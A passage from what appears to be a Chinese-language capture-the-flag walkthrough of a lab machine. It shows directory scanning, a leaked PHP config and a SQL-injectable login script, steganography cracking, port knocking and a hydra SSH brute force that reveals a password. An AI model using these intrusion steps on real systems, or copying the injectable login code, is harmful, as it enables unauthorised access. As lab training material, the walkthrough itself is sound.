class="symbol">/.htpasswd</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.php</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.jpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.html</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.wbpg</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.jpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.html</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.wbpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.php</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.jpg</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.html</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.php</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.wbpg</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.jpg</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.html</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.php</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.wbpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/3.jpg</span>                (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">61259</span>]</span><br><span class="line"><span class="symbol">/.ht.jpg</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.html</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht</span>                  (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.php</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.wbpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="params">Progress:</span> <span class="number">81220</span> <span class="symbol">/</span> <span class="number">81225</span> (<span class="number">99.99</span>%)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Finished</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br></pre></td></tr></table></figure></div>
+<p>config.php:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user &#x27;root&#x27; with no password) */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hackable&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="variable">$conexao</span> = <span class="title function_ invoke__">mysqli_connect</span>(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conexao</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR: Could not connect. &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>login.php:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$usuario</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$senha</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot; SELECT * FROM usuarios WHERE user = &#x27;&#123;$usuario&#125;&#x27; and pass = &#x27;&#123;$senha&#125;&#x27;&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conexao</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = mysqli_num_rows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#valida莽茫o conta</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> == <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;usuario&#x27;</span>] = <span class="variable">$usuario</span>;</span><br><span class="line">	header(<span class="string">&#x27;Location: 3.jpg&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;nao_autenticado&#x27;</span>] = true;</span><br><span class="line">	header(<span class="string">&#x27;Location: login_page/login.html&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+<p>根据代码去&#x2F;login_page&#x2F;login.html路径，发现是一个登录界面用刚才config.php中的代码知道用户名是root，密码为空<br>但是这样子登录之后又给我返回php源代码部分<br>看这个代码登录成功也是给我定位到3.jpg里面了。那我直接获取这个3.jpg然后用stegseek破解一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# stegseek -wl /usr/share/wordlists/rockyou.txt <span class="number">3.</span>jpg         </span><br><span class="line"><span class="symbol">StegSeek</span> <span class="number">0.6</span> - https://github.com/<span class="symbol">RickdeJager</span>/<span class="symbol">StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Found</span> passphrase: <span class="string">&quot;&quot;</span></span><br><span class="line">[i] <span class="symbol">Original</span> filename: <span class="string">&quot;steganopayload148505.txt&quot;</span>.</span><br><span class="line">[i] <span class="symbol">Extracting</span> to <span class="string">&quot;3.jpg.out&quot;</span>.</span><br></pre></td></tr></table></figure></div>
+<p>得到 porta:65535  尝试用这两个端口knock了一下还是不行<br>那就说明我们信息获取还不过，所以继续用别的扫描器试试</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.179.164</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.179.164/_25-02-11_17-49-38.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">38</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">38</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">315</span>B  <span class="operator">-</span> <span class="symbol">/js</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>js<span class="symbol">/</span>               </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">42</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/backup</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>backup<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">42</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">460</span>B  <span class="operator">-</span> <span class="operator">/</span>backup<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/config</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>config<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">507</span>B  <span class="operator">-</span> <span class="symbol">/config.php</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">452</span>B  <span class="operator">-</span> <span class="operator">/</span>config<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">316</span>B  <span class="operator">-</span> <span class="symbol">/css</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>css<span class="symbol">/</span>             </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">3</span>KB <span class="operator">-</span> <span class="symbol">/home.html</span>                                        </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">456</span>B  <span class="operator">-</span> <span class="operator">/</span>js<span class="symbol">/</span>                                              </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">46</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">487</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span>                                        </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">33</span>B  <span class="operator">-</span> <span class="symbol">/robots.txt</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br></pre></td></tr></table></figure></div>
+<p>还真扫出来了其他目录，访问backup目录，得到一个wordlist文件，应该是用来爆破的<br>这里还有一个css目录也是多级目录，访问之后也可以看到文件，得到一个brainfuck加密的密文</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BRAINFUCK"><figure class="iseeu highlight /brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">┌──(root㉿kakeru)</span><span class="literal">-</span><span class="title">[</span><span class="comment">~/tmp</span><span class="title">]</span></span><br><span class="line"><span class="comment">└─# curl http://192</span><span class="string">.</span><span class="comment">168</span><span class="string">.</span><span class="comment">179</span><span class="string">.</span><span class="comment">164/css/2</span><span class="string">.</span><span class="comment">txt</span></span><br><span class="line"><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span> </span><br></pre></td></tr></table></figure></div>
+<p>随便找一个在线解密网站得到4444<br>然后将4444 10000 65535 尝试不同顺序knock最后让22端口开放</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap  192.168.179.164</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">04</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>)</span><br><span class="line">Host is up (<span class="number">0.00040</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">2</span>A:A3:<span class="number">5</span>A:<span class="number">42</span>:<span class="number">17</span>:<span class="number">24</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.29</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
+<p>接下来就是用刚才得到的用户名和wordlist爆破ssh了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l jubiscleudo -P pass.txt ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">07</span>:<span class="number">33</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">300</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">300</span>), ~<span class="number">19</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>   <span class="keyword">login</span>: jubiscleudo   <span class="keyword">password</span>: onlymy</span><br><span class="line">[STATUS] <span class="number">300.00</span> tries/min, <span class="number">300</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">5</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">7</span> active</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">5</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span 